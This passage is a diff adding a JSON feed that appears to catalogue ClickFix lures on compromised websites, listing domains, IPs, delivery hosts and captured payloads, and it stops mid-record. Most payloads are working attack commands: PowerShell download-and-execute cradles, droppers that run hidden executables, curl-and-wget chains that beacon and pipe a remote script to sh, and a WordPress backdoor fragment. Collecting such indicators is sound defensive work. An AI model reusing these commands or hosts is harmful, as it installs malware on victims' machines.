@@ -1,0 +1,2009 @@
+[
+  {
+    "UrlDomain": "www.humanconnect.in",
+    "DeliveryUrl": [
+      "gl.githack.com"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "162.241.85.104"
+    ],
+    "Related": [],
+    "Payload": "IRM gl[.]githack[.]com/wiktor1992/53ffa7-d630-49af-a405-7e7278271132/-/raw/main/30-9434283BDFec | IEX",
+    "ResolvedDownloadUrl": [
+      "https://gl.githack.com/wiktor1992/53ffa7-d630-49af-a405-7e7278271132/-/raw/main/30-9434283BDFec"
+    ],
+    "ReportId": "cmw9srt1q06cd0omlh9mc1uk8"
+  },
+  {
+    "UrlDomain": "simintejarat.ir",
+    "DeliveryUrl": [
+      "gl.githack.com"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "87.236.209.219"
+    ],
+    "Related": [],
+    "Payload": "IRM gl[.]githack[.]com/rytu08-74/cc2f-bf9b9-76a8-f5-a-0a43c2/-/raw/main/4-4dEA-d-b803 | IEX",
+    "ResolvedDownloadUrl": [
+      "https://gl.githack.com/rytu08-74/cc2f-bf9b9-76a8-f5-a-0a43c2/-/raw/main/4-4dEA-d-b803"
+    ],
+    "ReportId": "cmw9spkbj06990omlfg3o6wbt"
+  },
+  {
+    "UrlDomain": "hattmeir.com",
+    "DeliveryUrl": [
+      "gl.githack.com"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "129.232.251.46"
+    ],
+    "Related": [
+      {
+        "Value": "https://images.unsplash.com/photo-1688573422524-a951027fb68f?ixid=m3w1odkynzf8mhwxfhnlyxjjahw5fhxjb3vudgrvd24lmjbjbg9ja3xlbnwwfdb8fhwxnziymju4odk0fda&amp;ixlib=rb-4.0.3&amp;fm=webp&amp;fit=crop&amp;crop=entropy&amp;w=1920&amp;h=1080&amp;q=20&amp;dpr=2)!important}.et_pb_section_1.et_pb_section{padding-top:8vw;padding-bottom:8vw;background-color:#000000!important}.et_pb_heading_4",
+        "Type": "Reference"
+      }
+    ],
+    "Payload": "IRM gl[.]githack[.]com/wiktor1992/53ffa7-d630-49af-a405-7e7278271132/-/raw/main/30-9434283BDFec | IEX",
+    "ResolvedDownloadUrl": [
+      "https://gl.githack.com/wiktor1992/53ffa7-d630-49af-a405-7e7278271132/-/raw/main/30-9434283BDFec"
+    ],
+    "ReportId": "cmw9sorkd068e0omlra2re0mm"
+  },
+  {
+    "UrlDomain": "scfc.ir",
+    "DeliveryUrl": [
+      "fastly.jsdelivr.net"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "195.211.47.67"
+    ],
+    "Related": [],
+    "Payload": "IRM fastly[.]jsdelivr[.]net/g\"h\"/wiktor1992kl/sds37465-df459-kcne8xhf-ajdf55/ea25409061fa | IEX",
+    "ResolvedDownloadUrl": [
+      "https://fastly.jsdelivr.net/gh/wiktor1992kl/sds37465-df459-kcne8xhf-ajdf55/ea25409061fa"
+    ],
+    "ReportId": "cmw9sktyg065b0omluyuqwbus"
+  },
+  {
+    "UrlDomain": "nownegah.com",
+    "DeliveryUrl": [
+      "gl.githack.com"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "185.112.35.2"
+    ],
+    "Related": [],
+    "Payload": "IRM gl[.]githack[.]com/rytu08-74/cc2f-bf9b9-76a8-f5-a-0a43c2/-/raw/main/4-4dEA-d-b803 | IEX",
+    "ResolvedDownloadUrl": [
+      "https://gl.githack.com/rytu08-74/cc2f-bf9b9-76a8-f5-a-0a43c2/-/raw/main/4-4dEA-d-b803"
+    ],
+    "ReportId": "cmw9skaqb064e0omlfadn4wxj"
+  },
+  {
+    "UrlDomain": "www.mariaelenaferraresi.it",
+    "DeliveryUrl": [
+      "gl.githack.com"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "89.46.110.68"
+    ],
+    "Related": [],
+    "Payload": "IRM gl[.]githack[.]com/rytu08-74/cc2f-bf9b9-76a8-f5-a-0a43c2/-/raw/main/4-4dEA-d-b803 | IEX",
+    "ResolvedDownloadUrl": [
+      "https://gl.githack.com/rytu08-74/cc2f-bf9b9-76a8-f5-a-0a43c2/-/raw/main/4-4dEA-d-b803"
+    ],
+    "ReportId": "cmw9sj86l05zm0omlpfcti0fc"
+  },
+  {
+    "UrlDomain": "nationalfirearmsact.com",
+    "DeliveryUrl": [
+      "swingerwives.com"
+    ],
+    "PayloadUrl": [
+      "https://swingerwives.com"
+    ],
+    "IP": [
+      "104.21.8.29"
+    ],
+    "Related": [],
+    "Payload": "$t=$env:APPDATA+[char]92+\"n\";$z=$t+[char]92+\"n.zip\";New-Item -Path $t -ItemType Directory -Force|Out-Null;curl.exe -sL -o $z \"https://swingerwives[.]com\";tar.exe -xf $z -C $t;Remove-Item $z;$e=Get-ChildItem $t -Recurse -Filter \"Beautifull.exe\"|Select-Object -First 1;if($e){$w=[wmiclass]\"Win32_Process\";$w.Create($e.FullName)|Out-Null};exit",
+    "ResolvedDownloadUrl": [
+      "https://swingerwives.com"
+    ],
+    "ReportId": "cmw9si8dw05yw0omlpbc2b3qx"
+  },
+  {
+    "UrlDomain": "moneyadvisor.investments",
+    "DeliveryUrl": [
+      "swingerwives.com"
+    ],
+    "PayloadUrl": [
+      "https://swingerwives.com"
+    ],
+    "IP": [
+      "172.67.130.177"
+    ],
+    "Related": [],
+    "Payload": "$t=$env:APPDATA+[char]92+\"n\";$z=$t+[char]92+\"n.zip\";New-Item -Path $t -ItemType Directory -Force|Out-Null;curl.exe -sL -o $z \"https://swingerwives[.]com\";tar.exe -xf $z -C $t;Remove-Item $z;$e=Get-ChildItem $t -Recurse -Filter \"Beautifull.exe\"|Select-Object -First 1;if($e){$w=[wmiclass]\"Win32_Process\";$w.Create($e.FullName)|Out-Null};exit",
+    "ResolvedDownloadUrl": [
+      "https://swingerwives.com"
+    ],
+    "ReportId": "cmw9si1j805yg0omlym3000qz"
+  },
+  {
+    "UrlDomain": "stories.cashchanger.co",
+    "DeliveryUrl": [
+      "swingerwives.com"
+    ],
+    "PayloadUrl": [
+      "https://swingerwives.com"
+    ],
+    "IP": [
+      "188.114.97.0"
+    ],
+    "Related": [],
+    "Payload": "$t=$env:APPDATA+[char]92+\"n\";$z=$t+[char]92+\"n.zip\";New-Item -Path $t -ItemType Directory -Force|Out-Null;curl.exe -sL -o $z \"https://swingerwives[.]com\";tar.exe -xf $z -C $t;Remove-Item $z;$e=Get-ChildItem $t -Recurse -Filter \"Beautifull.exe\"|Select-Object -First 1;if($e){$w=[wmiclass]\"Win32_Process\";$w.Create($e.FullName)|Out-Null};exit",
+    "ResolvedDownloadUrl": [
+      "https://swingerwives.com"
+    ],
+    "ReportId": "cmw9shs4l05xv0omlhtz5zdzi"
+  },
+  {
+    "UrlDomain": "www.eloyawards.com",
+    "DeliveryUrl": [
+      "swingerwives.com"
+    ],
+    "PayloadUrl": [
+      "https://swingerwives.com"
+    ],
+    "IP": [
+      "46.30.215.114"
+    ],
+    "Related": [],
+    "Payload": "$t=$env:APPDATA+[char]92+\"n\";$z=$t+[char]92+\"n.zip\";New-Item -Path $t -ItemType Directory -Force|Out-Null;curl.exe -sL -o $z \"https://swingerwives[.]com\";tar.exe -xf $z -C $t;Remove-Item $z;$e=Get-ChildItem $t -Recurse -Filter \"Beautifull.exe\"|Select-Object -First 1;if($e){$w=[wmiclass]\"Win32_Process\";$w.Create($e.FullName)|Out-Null};exit",
+    "ResolvedDownloadUrl": [
+      "https://swingerwives.com"
+    ],
+    "ReportId": "cmw9shln705xc0omlp9awd1n3"
+  },
+  {
+    "UrlDomain": "www.bang-thaimassage-bremen.de",
+    "DeliveryUrl": [
+      "swingerwives.com"
+    ],
+    "PayloadUrl": [
+      "https://swingerwives.com"
+    ],
+    "IP": [
+      "46.30.213.102"
+    ],
+    "Related": [],
+    "Payload": "$t=$env:APPDATA+[char]92+\"n\";$z=$t+[char]92+\"n.zip\";New-Item -Path $t -ItemType Directory -Force|Out-Null;curl.exe -sL -o $z \"https://swingerwives[.]com\";tar.exe -xf $z -C $t;Remove-Item $z;$e=Get-ChildItem $t -Recurse -Filter \"Beautifull.exe\"|Select-Object -First 1;if($e){$w=[wmiclass]\"Win32_Process\";$w.Create($e.FullName)|Out-Null};exit",
+    "ResolvedDownloadUrl": [
+      "https://swingerwives.com"
+    ],
+    "ReportId": "cmw9shf3305wt0oml1jjheemv"
+  },
+  {
+    "UrlDomain": "www.madenlersinavanaokulu.com",
+    "DeliveryUrl": [
+      "swingerwives.com"
+    ],
+    "PayloadUrl": [
+      "https://swingerwives.com"
+    ],
+    "IP": [
+      "94.138.202.35"
+    ],
+    "Related": [],
+    "Payload": "$t=$env:APPDATA+[char]92+\"n\";$z=$t+[char]92+\"n.zip\";New-Item -Path $t -ItemType Directory -Force|Out-Null;curl.exe -sL -o $z \"https://swingerwives[.]com\";tar.exe -xf $z -C $t;Remove-Item $z;$e=Get-ChildItem $t -Recurse -Filter \"Beautifull.exe\"|Select-Object -First 1;if($e){$w=[wmiclass]\"Win32_Process\";$w.Create($e.FullName)|Out-Null};exit",
+    "ResolvedDownloadUrl": [
+      "https://swingerwives.com"
+    ],
+    "ReportId": "cmw9sh50c05w90omle4x5fc79"
+  },
+  {
+    "UrlDomain": "www.metiersfutur.com",
+    "DeliveryUrl": [
+      "swingerwives.com"
+    ],
+    "PayloadUrl": [
+      "https://swingerwives.com"
+    ],
+    "IP": [
+      "217.160.0.54"
+    ],
+    "Related": [],
+    "Payload": "$t=$env:APPDATA+[char]92+\"n\";$z=$t+[char]92+\"n.zip\";New-Item -Path $t -ItemType Directory -Force|Out-Null;curl.exe -sL -o $z \"https://swingerwives[.]com\";tar.exe -xf $z -C $t;Remove-Item $z;$e=Get-ChildItem $t -Recurse -Filter \"Beautifull.exe\"|Select-Object -First 1;if($e){$w=[wmiclass]\"Win32_Process\";$w.Create($e.FullName)|Out-Null};exit",
+    "ResolvedDownloadUrl": [
+      "https://swingerwives.com"
+    ],
+    "ReportId": "cmw9sh1y605vs0omlqjdv0orq"
+  },
+  {
+    "UrlDomain": "delivery.boemdelivery.gr",
+    "DeliveryUrl": [
+      "swingerwives.com"
+    ],
+    "PayloadUrl": [
+      "https://swingerwives.com"
+    ],
+    "IP": [
+      "91.98.176.252"
+    ],
+    "Related": [],
+    "Payload": "$t=$env:APPDATA+[char]92+\"n\";$z=$t+[char]92+\"n.zip\";New-Item -Path $t -ItemType Directory -Force|Out-Null;curl.exe -sL -o $z \"https://swingerwives[.]com\";tar.exe -xf $z -C $t;Remove-Item $z;$e=Get-ChildItem $t -Recurse -Filter \"Beautifull.exe\"|Select-Object -First 1;if($e){$w=[wmiclass]\"Win32_Process\";$w.Create($e.FullName)|Out-Null};exit",
+    "ResolvedDownloadUrl": [
+      "https://swingerwives.com"
+    ],
+    "ReportId": "cmw9sg9wy05tc0oml4p0025cf"
+  },
+  {
+    "UrlDomain": "www.citizensvoice.com.pk",
+    "DeliveryUrl": [
+      "swingerwives.com"
+    ],
+    "PayloadUrl": [
+      "https://swingerwives.com"
+    ],
+    "IP": [
+      "172.67.192.210"
+    ],
+    "Related": [],
+    "Payload": "$t=$env:APPDATA+[char]92+\"n\";$z=$t+[char]92+\"n.zip\";New-Item -Path $t -ItemType Directory -Force|Out-Null;curl.exe -sL -o $z \"https://swingerwives[.]com\";tar.exe -xf $z -C $t;Remove-Item $z;$e=Get-ChildItem $t -Recurse -Filter \"Beautifull.exe\"|Select-Object -First 1;if($e){$w=[wmiclass]\"Win32_Process\";$w.Create($e.FullName)|Out-Null};exit",
+    "ResolvedDownloadUrl": [
+      "https://swingerwives.com"
+    ],
+    "ReportId": "cmw9sfwd105su0oml6cocbb2i"
+  },
+  {
+    "UrlDomain": "security.packt.com",
+    "DeliveryUrl": [
+      "swingerwives.com"
+    ],
+    "PayloadUrl": [
+      "https://swingerwives.com"
+    ],
+    "IP": [
+      "104.18.14.34"
+    ],
+    "Related": [],
+    "Payload": "$t=$env:APPDATA+[char]92+\"n\";$z=$t+[char]92+\"n.zip\";New-Item -Path $t -ItemType Directory -Force|Out-Null;curl.exe -sL -o $z \"https://swingerwives[.]com\";tar.exe -xf $z -C $t;Remove-Item $z;$e=Get-ChildItem $t -Recurse -Filter \"Beautifull.exe\"|Select-Object -First 1;if($e){$w=[wmiclass]\"Win32_Process\";$w.Create($e.FullName)|Out-Null};exit",
+    "ResolvedDownloadUrl": [
+      "https://swingerwives.com"
+    ],
+    "ReportId": "cmw9sfm3a05sb0omllcjd4y8e"
+  },
+  {
+    "UrlDomain": "www.itipack.it",
+    "DeliveryUrl": [
+      "swingerwives.com"
+    ],
+    "PayloadUrl": [
+      "https://swingerwives.com"
+    ],
+    "IP": [
+      "213.178.196.205"
+    ],
+    "Related": [],
+    "Payload": "$t=$env:APPDATA+[char]92+\"n\";$z=$t+[char]92+\"n.zip\";New-Item -Path $t -ItemType Directory -Force|Out-Null;curl.exe -sL -o $z \"https://swingerwives[.]com\";tar.exe -xf $z -C $t;Remove-Item $z;$e=Get-ChildItem $t -Recurse -Filter \"Beautifull.exe\"|Select-Object -First 1;if($e){$w=[wmiclass]\"Win32_Process\";$w.Create($e.FullName)|Out-Null};exit",
+    "ResolvedDownloadUrl": [
+      "https://swingerwives.com"
+    ],
+    "ReportId": "cmw9sfa3705rr0omlnlya8cyn"
+  },
+  {
+    "UrlDomain": "hexaone.co",
+    "DeliveryUrl": [
+      "likingdropout.site",
+      "gl.githack.com"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "50.87.170.107"
+    ],
+    "Related": [],
+    "Payload": "$tok='XHSS_WIe4Mqh66raXBF1hUhOzM1uf8PM7h0gNNIG1f0';$id='8ce4c033ffe5bd99';$interval=420; function _ea_inv($cfg){ $r=array('ts'=>time(),'wp'=>(function_exists('get_bloginfo')?get_bloginfo('version'):''),'php'=>PHP_VERSION); $chk=function($p,$m){$o=array('path'=>$p,'exists'=>false,'marker'=>false,'size'=>0);if(!$p||!is_string($p))return $o; if(@is_file($p)){$b=@file_get_contents($p);$o['exists']=true;$o['size']=strlen((string)$b);$o['marker']=($b&&strpos($b,$m)!==false);}return $o;}; $r['stub']=$chk($cfg['stub'],$cfg['ctrl']); $vis=array('plugin'=>null,'paths'=>array()); foreach($cfg['vis_paths'] as $_vp){$vis['paths'][]=$chk($_vp,$cfg['vis']);} $found=null;foreach($vis['paths'] as $_p){if(!empty($_p['marker'])){$found=$_p;break;}} if(!$found){$pd=WP_CONTENT_DIR.'/plugins';if(@is_dir($pd)){foreach(@glob($pd.'/*/*.php')?:array() as $_f){$b=@file_get_contents($_f);if($b&&strpos($b,'// ea_plug')!==false){$found=$chk($_f,'// ea_plug');break;}}} $vis['plugin']=$found?:array('path'=>'','exists'=>false,'marker'=>false); $r['visitor']=$vis; $mu=array('path'=>'','exists'=>false,'marker'=>false);$md=WP_CONTENT_DIR.'/mu-plugins'; if(@is_dir($md)){foreach(@glob($md.'/*.php')?:array() as $_f){$b=@file_get_contents($_f);if($b&&strpos($b,'// ea_mu')!==false){$mu=$chk($_f,'// ea_mu');break;}}} $r['mu_autologin']=$mu; $ft=0;$fw=0;$td=WP_CONTENT_DIR.'/themes';if(@is_dir($td)){foreach(@glob($td.'/*/functions.php')?:array() as $_f){$ft++;$b=@file_get_contents($_f);if($b&&strpos($b,'// _ea_al')!==false)$fw++;}} $r['functions_autologin']=array('themes_total'=>$ft,'themes_with_marker'=>$fw); $wpc=array('path'=>(defined('ABSPATH')?ABSPATH.'wp-config.php':''),'exists'=>false,'marker'=>false); if($wpc['path']&&@is_file($wpc['path'])){$b=@file_get_contents($wpc['path']);$wpc['exists']=true;$wpc['marker']=($b&&(",
+    "ResolvedDownloadUrl": [],
+    "ReportId": "cmw9sf00505q40omll93y5pf4"
+  },
+  {
+    "UrlDomain": "capture-con.gr",
+    "DeliveryUrl": [
+      "swingerwives.com"
+    ],
+    "PayloadUrl": [
+      "https://swingerwives.com"
+    ],
+    "IP": [
+      "185.25.23.211"
+    ],
+    "Related": [],
+    "Payload": "$t=$env:APPDATA+[char]92+\"n\";$z=$t+[char]92+\"n.zip\";New-Item -Path $t -ItemType Directory -Force|Out-Null;curl.exe -sL -o $z \"https://swingerwives[.]com\";tar.exe -xf $z -C $t;Remove-Item $z;$e=Get-ChildItem $t -Recurse -Filter \"Beautifull.exe\"|Select-Object -First 1;if($e){$w=[wmiclass]\"Win32_Process\";$w.Create($e.FullName)|Out-Null};exit",
+    "ResolvedDownloadUrl": [
+      "https://swingerwives.com"
+    ],
+    "ReportId": "cmw9sec4t05nn0omlwdjnuup9"
+  },
+  {
+    "UrlDomain": "jurbarkobitininkai.lt",
+    "DeliveryUrl": [
+      "fastly.jsdelivr.net"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "109.235.66.5"
+    ],
+    "Related": [],
+    "Payload": "IRM fastly[.]jsdelivr[.]net/g\"h\"/wiktor1992kl/sds37465-df459-kcne8xhf-ajdf55/ea25409061fa | IEX",
+    "ResolvedDownloadUrl": [
+      "https://fastly.jsdelivr.net/gh/wiktor1992kl/sds37465-df459-kcne8xhf-ajdf55/ea25409061fa"
+    ],
+    "ReportId": "cmw9saotl05gj0omlanf5buol"
+  },
+  {
+    "UrlDomain": "sky247official.com",
+    "DeliveryUrl": [
+      "cdn.jsdelivr.net"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "188.114.97.0"
+    ],
+    "Related": [],
+    "Payload": "Hex/obfuscated IP delivery: ...ntLoaded', startCallbackPolling); <!-- clickfix-observer-corpus --> IRM c\"d\"n[.]jsdelivr[.]net/g\"h\"/447349472638/0845D1a-D29D-43e2-AcD9-356Ea09250ec/d5-b17A-Ee4F8c9323af | IEX IRM c\"d\"n[.]jsdelivr[.]net/g\"h\"/447349472...",
+    "ResolvedDownloadUrl": [
+      "https://cdn.jsdelivr.net/gh/447349472638/0845D1a-D29D-43e2-AcD9-356Ea09250ec/d5-b17A-Ee4F8c9323af",
+      "https://cdn.jsdelivr.net/gh/447349472"
+    ],
+    "ReportId": "cmw9s0e8w050u0oml3hvppp7a"
+  },
+  {
+    "UrlDomain": "bergiedigital.com",
+    "DeliveryUrl": [
+      "copiose.org",
+      "sky.dolcefantasia.us",
+      "yaponovosh.org",
+      "cloudeccentric.cc"
+    ],
+    "PayloadUrl": [
+      "https://copiose.org/lom/62a9405c9735a1a7"
+    ],
+    "IP": [
+      "160.153.0.24"
+    ],
+    "Related": [],
+    "Payload": "iex(irm 'https://copiose[.]org/lom/62a9405c9735a1a7' -UserAgent 'WUA/8382bc918d' -Headers @{'X-WUA'='8382bc918d'})",
+    "ResolvedDownloadUrl": [
+      "https://copiose.org/lom/62a9405c9735a1a7"
+    ],
+    "ReportId": "cmw9qc8do03h30omlv9zigk19"
+  },
+  {
+    "UrlDomain": "imretrades.com",
+    "DeliveryUrl": [
+      "cloudeccentric.cc",
+      "yaponovosh.org",
+      "cosmical2049.com"
+    ],
+    "PayloadUrl": [
+      "https://cosmical2049.com/lom3/0ad7a0bdad0aa13d"
+    ],
+    "IP": [
+      "141.193.213.10"
+    ],
+    "Related": [],
+    "Payload": "(irm 'https://cosmical2049[.]com/lom3/0ad7a0bdad0aa13d' -UserAgent 'WUA/adedf1881f' -Headers @{'X-WUA'='adedf1881f'})|iex",
+    "ResolvedDownloadUrl": [
+      "https://cosmical2049.com/lom3/0ad7a0bdad0aa13d"
+    ],
+    "ReportId": "cmw9n6mj101wv0oml32xyr1jx"
+  },
+  {
+    "UrlDomain": "thesuperlead.com",
+    "DeliveryUrl": [
+      "gl.githack.com"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "160.153.0.179"
+    ],
+    "Related": [],
+    "Payload": "IRM gl[.]githack[.]com/wiktor1992/53ffa7-d630-49af-a405-7e7278271132/-/raw/main/30-9434283BDFec | IEX",
+    "ResolvedDownloadUrl": [
+      "https://gl.githack.com/wiktor1992/53ffa7-d630-49af-a405-7e7278271132/-/raw/main/30-9434283BDFec"
+    ],
+    "ReportId": "cmw9j217600v80omls8fciut4"
+  },
+  {
+    "UrlDomain": "utlin.com",
+    "DeliveryUrl": [
+      "gl.githack.com"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "188.114.96.0"
+    ],
+    "Related": [],
+    "Payload": "IRM gl[.]githack[.]com/wiktor1992/53ffa7-d630-49af-a405-7e7278271132/-/raw/main/30-9434283BDFec | IEX",
+    "ResolvedDownloadUrl": [
+      "https://gl.githack.com/wiktor1992/53ffa7-d630-49af-a405-7e7278271132/-/raw/main/30-9434283BDFec"
+    ],
+    "ReportId": "cmw9g3lxz00h00oml615sax5b"
+  },
+  {
+    "UrlDomain": "st-shop.nl",
+    "DeliveryUrl": [
+      "physioga.net"
+    ],
+    "PayloadUrl": [
+      "https://physioga.net/u/stage1.cmd&%tmp%"
+    ],
+    "IP": [
+      "192.124.249.84"
+    ],
+    "Related": [],
+    "Payload": "cmd /c start /min cmd /c \"curl -sko %tmp%\\\\~u.cmd https://' + SCRIPTS_DOMAIN + '/u/stage1.cmd&%tmp%\\\\~u.cmd\"",
+    "ResolvedDownloadUrl": [],
+    "ReportId": "cmw9g2kme00et0omlszyw2f1j"
+  },
+  {
+    "UrlDomain": "ai.support.studyway.ai",
+    "DeliveryUrl": [
+      "gl.githack.com"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "180.93.172.36"
+    ],
+    "Related": [
+      {
+        "Value": "n",
+        "Type": "Hostname"
+      }
+    ],
+    "Payload": "IRM gl[.]githack[.]com/rytu08-74/cc2f-bf9b9-76a8-f5-a-0a43c2/-/raw/main/4-4dEA-d-b803 | IEX",
+    "ResolvedDownloadUrl": [
+      "https://gl.githack.com/rytu08-74/cc2f-bf9b9-76a8-f5-a-0a43c2/-/raw/main/4-4dEA-d-b803"
+    ],
+    "ReportId": "cmw9cf1pj2iv80oml75c467mf"
+  },
+  {
+    "UrlDomain": "asyncmove.com",
+    "DeliveryUrl": [
+      "gl.githack.com"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "37.60.252.205"
+    ],
+    "Related": [],
+    "Payload": "IRM gl[.]githack[.]com/rytu08-74/cc2f-bf9b9-76a8-f5-a-0a43c2/-/raw/main/4-4dEA-d-b803 | IEX",
+    "ResolvedDownloadUrl": [
+      "https://gl.githack.com/rytu08-74/cc2f-bf9b9-76a8-f5-a-0a43c2/-/raw/main/4-4dEA-d-b803"
+    ],
+    "ReportId": "cmw9cew5j2iui0omli3epud81"
+  },
+  {
+    "UrlDomain": "www.prolocorovagnate.it",
+    "DeliveryUrl": [
+      "gl.githack.com"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "89.46.109.21"
+    ],
+    "Related": [],
+    "Payload": "IRM gl[.]githack[.]com/rytu08-74/cc2f-bf9b9-76a8-f5-a-0a43c2/-/raw/main/4-4dEA-d-b803 | IEX",
+    "ResolvedDownloadUrl": [
+      "https://gl.githack.com/rytu08-74/cc2f-bf9b9-76a8-f5-a-0a43c2/-/raw/main/4-4dEA-d-b803"
+    ],
+    "ReportId": "cmw93kaoj2igo0omlf6r87ldo"
+  },
+  {
+    "UrlDomain": "ghanawebdirectory.com",
+    "DeliveryUrl": [
+      "script.google.com",
+      "script-six-tawny.vercel.app"
+    ],
+    "PayloadUrl": [
+      "https://script.google.com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec",
+      "https://script-six-tawny.vercel.app/lin",
+      "https://script-six-tawny.vercel.app/mac"
+    ],
+    "IP": [
+      "77.37.83.235"
+    ],
+    "Related": [
+      {
+        "Value": "https://silverrogpuia.pro/t.js?site=a8de13ea441327f83d3fd28514f91ea5",
+        "Type": "Reference"
+      }
+    ],
+    "Payload": "curl -sL -d \"id=4f7a58c8-8e19-4964-b255-4d277312ae80&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fghanawebdirectory[.]com%2F&os=Linux%20x86_64&lastVisitAt=2026-11-09T09%3A34%3A02.296Z&lastShellAt=2026-11-09T09%3A34%3A02.296Z\" \"https://script[.]google[.]com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec\" && wget -qO- 'https://script-six-tawny[.]vercel[.]app/lin' -L | sh",
+    "ResolvedDownloadUrl": [
+      "https://script.google.com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec",
+      "https://script-six-tawny.vercel.app/lin"
+    ],
+    "ReportId": "cmw92gdsu2i5y0omlbhso6vbf"
+  },
+  {
+    "UrlDomain": "southwestsocialservicesinc.com",
+    "DeliveryUrl": [
+      "script-six-tawny.vercel.app",
+      "script.google.com"
+    ],
+    "PayloadUrl": [
+      "https://script.google.com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec",
+      "https://script-six-tawny.vercel.app/lin",
+      "https://script-six-tawny.vercel.app/win",
+      "https://script-six-tawny.vercel.app/mac"
+    ],
+    "IP": [
+      "77.37.83.216"
+    ],
+    "Related": [],
+    "Payload": "curl -sL -d \"id=21a93fe7-8de4-49ec-bc9a-e8158d30427a&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fsouthwestsocialservicesinc[.]com%2F&os=Linux%20x86_64&lastVisitAt=2026-11-09T09%3A00%3A45.004Z&lastShellAt=2026-11-09T09%3A00%3A45.004Z\" \"https://script[.]google[.]com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec\" && wget -qO- 'https://script-six-tawny[.]vercel[.]app/lin' -L | sh",
+    "ResolvedDownloadUrl": [
+      "https://script.google.com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec",
+      "https://script-six-tawny.vercel.app/lin"
+    ],
+    "ReportId": "cmw919kau2hq20omlin08m3ae"
+  },
+  {
+    "UrlDomain": "diazlawncareandmaintenance.com",
+    "DeliveryUrl": [
+      "script.google.com",
+      "script-six-tawny.vercel.app"
+    ],
+    "PayloadUrl": [
+      "https://script.google.com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec",
+      "https://script-six-tawny.vercel.app/lin",
+      "https://script-six-tawny.vercel.app/win",
+      "https://script-six-tawny.vercel.app/mac"
+    ],
+    "IP": [
+      "77.37.83.201"
+    ],
+    "Related": [
+      {
+        "Value": "https://beacon-floaix-j38uu.pro/t.js?site=065274da8fe72c6862b6629894c947c1",
+        "Type": "Reference"
+      }
+    ],
+    "Payload": "curl -sL -d \"id=851a2189-cf51-42eb-bb25-0aca6fff4673&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fdiazlawncareandmaintenance[.]com%2F&os=Linux%20x86_64&lastVisitAt=2026-11-09T08%3A59%3A37.231Z&lastShellAt=2026-11-09T08%3A59%3A37.231Z\" \"https://script[.]google[.]com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec\" && wget -qO- 'https://script-six-tawny[.]vercel[.]app/lin' -L | sh",
+    "ResolvedDownloadUrl": [
+      "https://script.google.com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec",
+      "https://script-six-tawny.vercel.app/lin"
+    ],
+    "ReportId": "cmw9185ff2hpc0oml2t2gkjiq"
+  },
+  {
+    "UrlDomain": "goinvest.co.ke",
+    "DeliveryUrl": [
+      "frclau.com"
+    ],
+    "PayloadUrl": [
+      "https://frclau.com/eoN"
+    ],
+    "IP": [
+      "77.37.53.28"
+    ],
+    "Related": [],
+    "Payload": "$url = \"https://frclau[.]com/eoN\";\n$filename = \"Boost Note.exe\";\n$path = $env:TEMP;\n$archive = Join-Path $path \"zN3HyHJT.zip\";\n$filepath = Join-Path $path $filename;\n$signature = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Win32 {\n\t[DllImport(\"kernel32.dll\")]\n\tpublic static extern IntPtr GetConsoleWindow();\n\t[DllImport(\"user32.dll\")]\n\tpublic static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);\n}\n\"@;\nAdd-Type $signature;\n$hwnd = [Win32]::GetConsoleWindow();\nif($hwnd -ne [IntPtr]::Zero)\n{\n\t[Win32]::ShowWindow($hwnd, 0);\n}\nNew-Item -Path $path -ItemType Directory -Force;\ncurl $url -o $archive;\nExpand-Archive -Path $archive -DestinationPath $path -Force;\nRemove-Item $archive -Force;\nStart-Process $filepath;\nexit",
+    "ResolvedDownloadUrl": [
+      "https://frclau.com/eoN"
+    ],
+    "ReportId": "cmw90vgh12h730omlll4eo8h9"
+  },
+  {
+    "UrlDomain": "artawiyah.org",
+    "DeliveryUrl": [
+      "makeverizyjar.info",
+      "frclau.com"
+    ],
+    "PayloadUrl": [
+      "https://frclau.com/eoN"
+    ],
+    "IP": [
+      "77.37.83.11"
+    ],
+    "Related": [
+      {
+        "Value": "https://frclau.com/ca.js",
+        "Type": "Reference"
+      },
+      {
+        "Value": "https://makeverizyjar.info/api.php?s=e24fc8572d6bb6b800cd73affdfe08d8a0982d40960c32b3&amp;_v=29903567",
+        "Type": "Reference"
+      }
+    ],
